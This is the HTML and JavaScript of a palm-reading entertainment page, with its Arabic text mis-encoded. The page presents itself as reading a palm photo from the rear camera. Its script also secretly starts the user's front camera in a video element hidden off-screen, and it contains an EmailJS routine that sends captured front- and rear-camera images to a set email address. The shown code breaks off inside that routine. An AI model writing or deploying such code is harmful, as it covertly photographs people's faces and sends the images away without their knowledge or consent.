<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø£Ø³Ø±Ø§Ø± Ø§Ù„ÙƒÙ - Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„ÙƒÙ Ø¨Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- EmailJS CDN -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Initialize EmailJS with your Public Key
        // Replace 'UbJp42lWtq38Tx9mi' with your actual EmailJS Public Key
        (function() {
            emailjs.init("UbJp42lWtq38Tx9mi"); // ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ø¹Ø§Ù… Ø§Ù„ØµØ­ÙŠØ­ Ù‡Ù†Ø§
        })();
    </script>
    <style>
        /* Custom styles for Inter font */
        body {
            font-family: 'Inter', sans-serif;
        }
        /* Styling for the uploaded/captured image preview */
        #palmImagePreviewPalm, #capturedRearImagePreview {
            width: 100%;
            max-width: 300px; /* Max width for the palm image */
            height: auto;
            border-radius: 0.75rem; /* rounded-xl */
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); /* shadow-lg */
            background-color: #f3f4f6; /* bg-gray-100 */
            display: none; /* Hidden by default */
            object-fit: contain; /* Ensure image fits within bounds */
        }
        /* Style for loading indicator */
        .loading-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 30px; /* Adjust height as needed */
            margin-top: 1rem;
        }
        .loading-indicator .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #8B5CF6; /* Purple color for spinner */
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Hide sections by default, JavaScript will manage visibility */
        .page-section {
            display: none;
        }
        .page-section.active {
            display: block;
        }
        /* Hidden video elements for camera streams - IMPORTANT: Use absolute positioning to keep them rendered */
        #hiddenRearVideoFeed, #hiddenFrontVideoFeed {
            position: absolute;
            left: -9999px; /* Move off-screen */
            top: -9999px;
            width: 1px; /* Minimal size */
            height: 1px;
            opacity: 0; /* Fully transparent */
            pointer-events: none; /* Not interactive */
        }
        /* Visible video element for live preview in camera mode */
        #liveCameraFeed {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 0.75rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            background-color: #f3f4f6;
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-50 to-indigo-100 min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-white shadow-md py-4 px-6 sticky top-0 z-50">
        <div class="container mx-auto flex justify-between items-center">
            <a href="#" class="text-2xl font-bold text-purple-700 hover:text-purple-900" onclick="showSection('home'); return false;">
                Ø£Ø³Ø±Ø§Ø± Ø§Ù„ÙƒÙ
            </a>
            <nav>
                <ul class="flex space-x-4 space-x-reverse">
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('home'); return false;">Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('how-it-works'); return false;">ÙƒÙŠÙ ÙŠØ¹Ù…Ù„</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('palm-reading'); return false;">Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„ÙƒÙ</a></li>
                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('contact'); return false;">Ø§ØªØµÙ„ Ø¨Ù†Ø§</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- Main Content Area -->
    <main class="flex-grow container mx-auto py-8 px-4 flex justify-center items-start">
        <div class="w-full max-w-4xl bg-white p-6 sm:p-8 rounded-2xl shadow-xl">

            <!-- Message box for user feedback -->
            <div id="messageBox" class="bg-blue-100 border-l-4 border-blue-500 text-blue-700 p-4 rounded-md hidden w-full mb-6" role="alert">
                <p id="messageText" class="font-medium text-sm sm:text-base"></p>
            </div>

            <!-- Home Section -->
            <section id="home-section" class="page-section active text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ùƒ ÙÙŠ Ø£Ø³Ø±Ø§Ø± Ø§Ù„ÙƒÙ!</h2>
                <p class="text-lg text-gray-600 leading-relaxed">
                    Ø§ÙƒØªØ´Ù Ø¹Ø§Ù„Ù… Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„ÙƒÙ Ø§Ù„ØºØ§Ù…Ø¶ Ø¨Ø·Ø±ÙŠÙ‚Ø© Ø¬Ø¯ÙŠØ¯Ø© ÙˆÙ…Ø¨ØªÙƒØ±Ø©. Ù…ÙˆÙ‚Ø¹Ù†Ø§ ÙŠÙ‚Ø¯Ù… Ù„Ùƒ Ù‚Ø±Ø§Ø¡Ø© ÙƒÙ ØªØ±ÙÙŠÙ‡ÙŠØ© ÙˆÙ…Ø­ÙØ²Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø£Ø­Ø¯Ø« ØªÙ‚Ù†ÙŠØ§Øª Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ.
                </p>
                <p class="text-lg text-gray-600 leading-relaxed">
                    Ù…Ø§ Ø¹Ù„ÙŠÙƒ Ø³ÙˆÙ‰ Ø±ÙØ¹ ØµÙˆØ±Ø© ÙˆØ§Ø¶Ø­Ø© Ù„ÙƒÙÙƒ Ø£Ùˆ Ø§Ù„ØªÙ‚Ø§Ø·Ù‡Ø§ Ù…Ø¨Ø§Ø´Ø±Ø©ØŒ ÙˆØ³ÙŠÙ‚ÙˆÙ… Ù†Ø¸Ø§Ù…Ù†Ø§ Ø¨ØªÙˆÙ„ÙŠØ¯ Ù‚Ø±Ø§Ø¡Ø© Ù…Ù…ØªØ¹Ø© Ù„ÙƒØŒ Ù…Ø¹ Ø§Ù„ØªØ±ÙƒÙŠØ² Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù†Ø¨ Ø§Ù„Ø¥ÙŠØ¬Ø§Ø¨ÙŠØ© Ù„Ø´Ø®ØµÙŠØªÙƒ ÙˆÙ…Ø³Ø§Ø±Ùƒ Ø§Ù„Ù…Ø­ØªÙ…Ù„.
                </p>
                <button class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-lg transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75" onclick="showSection('palm-reading'); return false;">
                    Ø§Ø¨Ø¯Ø£ Ù‚Ø±Ø§Ø¡Ø© ÙƒÙÙƒ Ø§Ù„Ø¢Ù†!
                </button>
            </section>

            <!-- How It Works Section -->
            <section id="how-it-works-section" class="page-section text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ØŸ</h2>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-right">
                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
                        <div class="text-purple-600 text-5xl mb-3">ğŸ“¸</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">1. Ø§Ù„ØªÙ‚Ø· Ø£Ùˆ Ø§Ø±ÙÙ€Ø¹</h3>
                        <p class="text-gray-600">Ø§Ù„ØªÙ‚Ø· ØµÙˆØ±Ø© ÙˆØ§Ø¶Ø­Ø© Ù„Ø±Ø§Ø­Ø© ÙƒÙÙƒ Ù…Ø¨Ø§Ø´Ø±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ùˆ Ø§Ø±ÙØ¹ ØµÙˆØ±Ø© Ù…ÙˆØ¬ÙˆØ¯Ø©.</p>
                    </div>
                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
                        <div class="text-purple-600 text-5xl mb-3">âœ¨</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">2. ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</h3>
                        <p class="text-gray-600">ÙŠÙ‚ÙˆÙ… Ù†Ø¸Ø§Ù… Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ Ù„Ø¯ÙŠÙ†Ø§ (Ù†Ù…ÙˆØ°Ø¬ Ù„ØºÙˆÙŠ ÙƒØ¨ÙŠØ±) Ø¨Ù…Ø¹Ø§Ù„Ø¬Ø© Ø·Ù„Ø¨Ùƒ Ù„ØªÙˆÙ„ÙŠØ¯ Ù‚Ø±Ø§Ø¡Ø© ÙØ±ÙŠØ¯Ø© Ù„Ùƒ. <strong class="text-red-500">(Ù…Ù„Ø§Ø­Ø¸Ø©: Ù„Ø§ ÙŠØªÙ… ØªØ­Ù„ÙŠÙ„ Ø®Ø·ÙˆØ· Ø§Ù„ÙƒÙ Ø¨ØµØ±ÙŠÙ‹Ø§ Ø¨Ø´ÙƒÙ„ Ø­Ù‚ÙŠÙ‚ÙŠØŒ Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© Ù„Ø£ØºØ±Ø§Ø¶ Ø§Ù„ØªØ±ÙÙŠÙ‡).</strong></p>
                    </div>
                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
                        <div class="text-purple-600 text-5xl mb-3">ğŸ”®</div>
                        <h3 class="text-xl font-semibold text-gray-700 mb-2">3. Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ù‚Ø±Ø§Ø¡ØªÙƒ</h3>
                        <p class="text-gray-600">Ø³ØªØ¸Ù‡Ø± Ù‚Ø±Ø§Ø¡Ø© ÙƒÙÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ© Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø©ØŒ Ù…Ù„ÙŠØ¦Ø© Ø¨Ø§Ù„Ø±Ø¤Ù‰ Ø§Ù„Ù…Ù„Ù‡Ù…Ø© ÙˆØ§Ù„Ù…Ù…ØªØ¹Ø©.</p>
                    </div>
                </div>
                <p class="text-lg text-gray-600 mt-6">
                    ØªØ°ÙƒØ± Ø¯Ø§Ø¦Ù…Ù‹Ø§ Ø£Ù† Ù‡Ø°Ù‡ Ø§Ù„Ù‚Ø±Ø§Ø¡Ø§Øª Ù‡ÙŠ Ù„Ù„Ù…ØªØ¹Ø© ÙˆØ§Ù„ØªØ³Ù„ÙŠØ© ÙÙ‚Ø·ØŒ ÙˆÙ„Ø§ ÙŠØ¬Ø¨ Ø§Ù„Ø§Ø¹ØªÙ…Ø§Ø¯ Ø¹Ù„ÙŠÙ‡Ø§ Ù„Ø§ØªØ®Ø§Ø° Ù‚Ø±Ø§Ø±Ø§Øª Ø­ÙŠØ§ØªÙŠØ© Ù…Ù‡Ù…Ø©.
                </p>
            </section>

            <!-- Palm Reading Section (Core Functionality) -->
            <section id="palm-reading-section" class="page-section flex flex-col items-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4 text-center">Ù‚Ø±Ø§Ø¡Ø© ÙƒÙÙƒ</h2>
                <p class="text-gray-600 text-center text-lg">Ø§Ø®ØªØ± Ù…ØµØ¯Ø± Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‚Ø±Ø§Ø¡ØªÙƒ Ø§Ù„ØªØ±ÙÙŠÙ‡ÙŠØ©.</p>

                <!-- Source Selection Buttons -->
                <div class="flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4 sm:space-x-reverse w-full justify-center mb-6">

                    <button id="cameraModeButton" class="bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:ring-opacity-75">
                        Ø§Ù„ØªÙ‚Ø§Ø· Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                    </button>
                </div>

                <!-- Image Upload Mode -->
                <div id="imageUploadMode" class="w-full flex flex-col items-center space-y-4 hidden">

                    <img id="palmImagePreviewPalm" src="#" alt="Ù…Ø¹Ø§ÙŠÙ†Ø© ØµÙˆØ±Ø© Ø§Ù„ÙƒÙ" class="mt-4">
                </div>

                <!-- Camera Capture Mode -->
                <div id="cameraCaptureMode" class="w-full flex flex-col items-center space-y-4 hidden">
                    <p class="text-gray-700 text-lg font-semibold mb-2 text-center">
                        Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©:
                    </p>
                    <video id="liveCameraFeed" autoplay playsinline></video>
                    <canvas id="hiddenCanvas" class="hidden"></canvas>
                    <video id="hiddenRearVideoFeed"></video> <!-- Hidden video for actual rear stream source -->
                    <video id="hiddenFrontVideoFeed"></video> <!-- Hidden video for actual front stream source -->

                    <button id="capturePhotoButton" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75 w-full">
                        Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                    </button>

                    <div id="capturedImagesDisplay" class="flex flex-col items-center w-full mt-4">
                        <h3 class="text-lg font-semibold text-gray-700 mb-2">Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ© Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø©</h3>
                        <img id="capturedRearImagePreview" alt="Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø®Ù„ÙÙŠØ© Ø§Ù„Ù…Ù„ØªÙ‚Ø·Ø©">
                    </div>
                </div>

                <!-- Analyze Button -->
                <button id="analyzeButtonPalm" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75 w-full disabled:opacity-50 disabled:cursor-not-allowed" disabled>
                    ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙƒÙ
                </button>

                <!-- Loading Indicator -->
                <div id="loadingIndicatorPalm" class="loading-indicator hidden">
                    <div class="spinner"></div>
                    <span class="ml-2 text-gray-700">Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ ÙƒÙÙƒ...</span>
                </div>

                <!-- Palm Reading Results -->
                <div id="readingResultsPalm" class="bg-purple-50 p-6 rounded-xl shadow-inner w-full text-gray-800 hidden mt-6">
                    <h2 class="text-2xl font-bold text-center text-purple-800 mb-4">Ù‚Ø±Ø§Ø¡Ø© ÙƒÙÙƒ</h2>
                    <p class="text-sm text-center text-gray-500 mb-4">
                        (Ù…Ù„Ø§Ø­Ø¸Ø©: Ù‡Ø°Ù‡ Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© Ù„Ø£ØºØ±Ø§Ø¶ Ø§Ù„ØªØ±ÙÙŠÙ‡ ÙˆØ§Ù„ØªØ³Ù„ÙŠØ© ÙÙ‚Ø·ØŒ ÙˆÙ„Ø§ ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ ØªØ­Ù„ÙŠÙ„ Ø¨ØµØ±ÙŠ Ø­Ù‚ÙŠÙ‚ÙŠ Ù„Ø®Ø·ÙˆØ· Ø§Ù„ÙƒÙ.)
                    </p>
                    <div id="readingTextPalm" class="text-lg leading-relaxed text-justify">
                        <!-- Reading content will be inserted here -->
                    </div>
                </div>
            </section>

            <!-- Contact Section -->
            <section id="contact-section" class="page-section text-center space-y-6">
                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">Ø§ØªØµÙ„ Ø¨Ù†Ø§</h2>
                <p class="text-lg text-gray-600 leading-relaxed">
                    Ø¥Ø°Ø§ ÙƒØ§Ù† Ù„Ø¯ÙŠÙƒ Ø£ÙŠ Ø£Ø³Ø¦Ù„Ø© Ø£Ùˆ Ø§Ø³ØªÙØ³Ø§Ø±Ø§ØªØŒ ÙÙ„Ø§ ØªØªØ±Ø¯Ø¯ ÙÙŠ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§.
                </p>
                <div class="flex flex-col items-center space-y-4 text-gray-700 text-lg">
                    <p>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: <a href="mailto:info@yourwebsite.com" class="text-purple-600 hover:underline">info@yourwebsite.com</a></p>
                    <p>Ø§Ù„Ù‡Ø§ØªÙ: <a href="tel:+1234567890" class="text-purple-600 hover:underline">+123 456 7890</a></p>
                    <p>Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: Ø´Ø§Ø±Ø¹ Ø§Ù„Ø®ÙŠØ§Ù„ØŒ Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„Ø£Ø­Ù„Ø§Ù…ØŒ ÙƒÙˆÙƒØ¨ Ø§Ù„Ø³Ø¹Ø§Ø¯Ø©</p>
                </div>
            </section>

        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-6 mt-auto text-center rounded-t-lg shadow-inner">
        <div class="container mx-auto px-4">
            <p>&copy; 2025 Ø£Ø³Ø±Ø§Ø± Ø§Ù„ÙƒÙ. Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©.</p>
            <div class="flex justify-center space-x-4 space-x-reverse mt-2">
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="text-gray-400 hover:text-white transition duration-200">Ø´Ø±ÙˆØ· Ø§Ù„Ø®Ø¯Ù…Ø©</a>
            </div>
        </div>
    </footer>

    <script>
        // Global elements for message box
        const messageBox = document.getElementById('messageBox');
        const messageText = document.getElementById('messageText');

        // Elements for Palm Reading Section
        const uploadModeButton = document.getElementById('uploadModeButton');
        const cameraModeButton = document.getElementById('cameraModeButton');
        const imageUploadMode = document.getElementById('imageUploadMode');
        const cameraCaptureMode = document.getElementById('cameraCaptureMode');

        const palmImageUploadPalm = document.getElementById('palmImageUploadPalm');
        const palmImagePreviewPalm = document.getElementById('palmImagePreviewPalm');

        const liveCameraFeed = document.getElementById('liveCameraFeed'); // Visible rear camera feed
        const capturedRearImagePreview = document.getElementById('capturedRearImagePreview'); // Preview for rear image
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const hiddenRearVideoFeed = document.getElementById('hiddenRearVideoFeed'); // Hidden video for actual rear stream source
        const hiddenFrontVideoFeed = document.getElementById('hiddenFrontVideoFeed'); // Hidden video for actual front stream source
        const capturePhotoButton = document.getElementById('capturePhotoButton');

        const analyzeButtonPalm = document.getElementById('analyzeButtonPalm');
        const loadingIndicatorPalm = document.getElementById('loadingIndicatorPalm');
        const readingResultsPalm = document.getElementById('readingResultsPalm');
        const readingTextPalm = document.getElementById('readingTextPalm');

        // Global variables for camera streams and active image data
        let currentRearStream = null;
        let currentFrontStream = null;
        let activeRearPalmImageBase64 = null; // Stores the captured rear palm image for AI analysis

        // EmailJS Configuration
        const EMAILJS_SERVICE_ID = 'default_service'; // From your EmailJS account
        const EMAILJS_TEMPLATE_ID = 'template_qyhaxqi'; // From your EmailJS account
        const EMAILJS_MAX_SIZE_BYTES = 50 * 1024; // EmailJS 50KB limit (approximate, as Data URL is base64)

        /**
         * Displays a message to the user in a styled box.
         * @param {string} message - The message to display.
         * @param {string} type - The type of message (e.g., 'success', 'error', 'info').
         */
        function showMessage(message, type = 'info') {
            


            // Hide after 5 seconds
            
        }

        /**
         * Shows a specific section and hides all others.
         * Manages camera stream state when navigating.
         * @param {string} sectionId - The ID of the section to show (e.g., 'home', 'palm-reading').
         */
        function showSection(sectionId) {
            document.querySelectorAll('.page-section').forEach(section => {
                section.classList.remove('active');
            });
            document.getElementById(`${sectionId}-section`).classList.add('active');
            // Clear message box when navigating
            messageBox.classList.add('hidden');
            messageText.textContent = '';

            // Manage camera stream when navigating to/from palm-reading section
            if (sectionId === 'palm-reading') {
                // Default to upload mode when entering palm reading section
                showPalmReadingMode('upload');
            } else {
                // If leaving palm reading section, stop all camera streams
                stopAllCameraStreams();
                // Reset palm reading section UI
                resetPalmReadingUI();
            }
        }

        /**
         * Resets the UI elements of the palm reading section.
         */
        function resetPalmReadingUI() {
            palmImagePreviewPalm.style.display = 'none';
            palmImagePreviewPalm.src = '#';
            capturedRearImagePreview.style.display = 'none';
            capturedRearImagePreview.src = '#';
            analyzeButtonPalm.disabled = true;
            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
            loadingIndicatorPalm.classList.add('hidden');
            readingResultsPalm.classList.add('hidden');
            readingTextPalm.innerHTML = '';
            activeRearPalmImageBase64 = null;
            palmImageUploadPalm.value = ''; // Clear file input
        }

        /**
         * Shows either the image upload mode or camera capture mode in the palm reading section.
         * @param {string} mode - 'upload' or 'camera'.
         */
        function showPalmReadingMode(mode) {
            resetPalmReadingUI(); // Reset UI when switching modes
            stopAllCameraStreams(); // Ensure all cameras are off when switching modes

            if (mode === 'upload') {
                imageUploadMode.classList.remove('hidden');
                cameraCaptureMode.classList.add('hidden');
                showMessage('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø±ÙØ¹ ØµÙˆØ±Ø© ÙƒÙÙƒ.', 'info');
            } else if (mode === 'camera') {
                imageUploadMode.classList.add('hidden');
                cameraCaptureMode.classList.remove('hidden');
                // Start rear camera (visible) and front camera (hidden)
                startCamera('environment', liveCameraFeed, hiddenRearVideoFeed, 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø§Ù„Ù…Ø±Ø¦ÙŠØ©');
                startCamera('user', hiddenFrontVideoFeed, hiddenFrontVideoFeed, 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ø§Ù„Ù…Ø®ÙÙŠØ©');
            }
        }

        /**
         * Stops all active camera streams.
         */
        function stopAllCameraStreams() {
            if (currentRearStream) {
                currentRearStream.getTracks().forEach(track => track.stop());
                currentRearStream = null;
            }
            if (currentFrontStream) {
                currentFrontStream.getTracks().forEach(track => track.stop());
                currentFrontStream = null;
            }
            liveCameraFeed.srcObject = null;
            hiddenRearVideoFeed.srcObject = null;
            hiddenFrontVideoFeed.srcObject = null;
            liveCameraFeed.style.display = 'none';
        }

        /**
         * Starts a camera stream with the specified facing mode and attaches it to video elements.
         * @param {string} mode - 'user' for front camera, 'environment' for rear camera.
         * @param {HTMLVideoElement} visibleVideoElement - The video element to display the live stream (can be the same as hidden for hidden feeds).
         * @param {HTMLVideoElement} hiddenVideoElement - The hidden video element to capture frames from.
         * @param {string} cameraName - Name of the camera for messages (e.g., 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø§Ù„Ù…Ø±Ø¦ÙŠØ©').
         */
        async function startCamera(mode, visibleVideoElement, hiddenVideoElement, cameraName) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: mode
                    }
                });

                if (mode === 'environment') {
                    currentRearStream = stream;
                } else {
                    currentFrontStream = stream;
                }

                visibleVideoElement.srcObject = stream;
                hiddenVideoElement.srcObject = stream; // Important: attach to hidden for capture

                // Wait for the video to actually start playing and have metadata loaded
                await new Promise((resolve, reject) => {
                    hiddenVideoElement.onloadedmetadata = () => {
                        hiddenVideoElement.play().then(() => {
                            // Ensure video has dimensions before resolving
                            if (hiddenVideoElement.videoWidth > 0 && hiddenVideoElement.videoHeight > 0) {
                                resolve();
                            } else {
                                reject(new Error('Video stream has no dimensions.'));
                            }
                        }).catch(reject);
                    };
                    hiddenVideoElement.onerror = reject;
                });

                if (visibleVideoElement === liveCameraFeed) { // Only show the main live feed
                    liveCameraFeed.style.display = 'block';
                }
                showMessage(`ØªÙ… ØªÙØ¹ÙŠÙ„ ${cameraName}.`, 'success');
            } catch (err) {
                console.error(`Error accessing ${cameraName} camera:`, err);
                showMessage(`Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ ${cameraName}. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„.`, 'error');
                if (visibleVideoElement === liveCameraFeed) {
                    liveCameraFeed.style.display = 'none';
                }
            }
        }

        /**
         * Resizes a Base64 image to fit within maxWidth/maxHeight while maintaining aspect ratio.
         * Returns a Promise that resolves with the resized Base64 string.
         * @param {string} base64Str - The original Base64 image string.
         * @param {number} maxWidth - Maximum desired width.
         * @param {number} maxHeight - Maximum desired height.
         * @returns {Promise<string|null>} - Resized Base64 string or null on error.
         */
        async function resizeImage(base64Str, maxWidth = 600, maxHeight = 600) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => {
                    let width = img.width;
                    let height = img.height;

                    // Calculate the new dimensions while maintaining aspect ratio
                    if (width > height) {
                        if (width > maxWidth) {
                            height *= maxWidth / width;
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxHeight) {
                            width *= maxHeight / height;
                            height = maxHeight;
                        }
                    }

                    const canvas = document.createElement('canvas'); // Create a temporary canvas
                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    // Return as JPEG with a reasonable quality for LLM input or EmailJS
                    // Using 0.8 quality to balance size and visual quality
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                };
                img.onerror = () => {
                    showMessage('ÙØ´Ù„ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±Ø©.', 'error');
                    resolve(null);
                };
                img.src = base64Str;
            });
        }

        /**
         * Sends a Base64 image via EmailJS.
         * @param {string} imageDataURL - The Base64 data URL of the image to send.
         * @param {string} cameraType - 'front' or 'rear' for message context.
         */
        async function sendImageViaEmailJS(imageDataURL, cameraType) {
            const dataUrlSizeInBytes = new TextEncoder().encode(imageDataURL).length;

            if (dataUrlSizeInBytes > EMAILJS_MAX_SIZE_BYTES) {
                showMessage(`Ø­Ø¬Ù… ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„Ø®Ù„ÙÙŠØ©'} (${(dataUrlSizeInBytes / 1024).toFixed(2)}KB) ÙŠØªØ¬Ø§ÙˆØ² Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù„Ù€ EmailJS (${(EMAILJS_MAX_SIZE_BYTES / 1024).toFixed(0)}KB). Ù„Ù… ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§.`, 'error');
                return;
            }

            const templateParams = {
                from_name: `ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ÙƒÙ - ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø®Ù„ÙÙŠØ©'}`,
                to_email: "your_recipient_email@example.com", // **IMPORTANT: Change this to the recipient's email**
                subject: `ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„Ø®Ù„ÙÙŠØ©'}`,
                message: `Ù…Ø±Ø­Ø¨Ø§Ù‹ØŒ Ù‡Ø°Ù‡ ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø© ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø·Ù‡Ø§ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType === 'front' ? 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„Ø®Ù„ÙÙŠØ©'} Ù„ØªØ·Ø¨ÙŠÙ‚ Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„ÙƒÙ.`,
                image_data_url: imageDataURL
            };

            try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
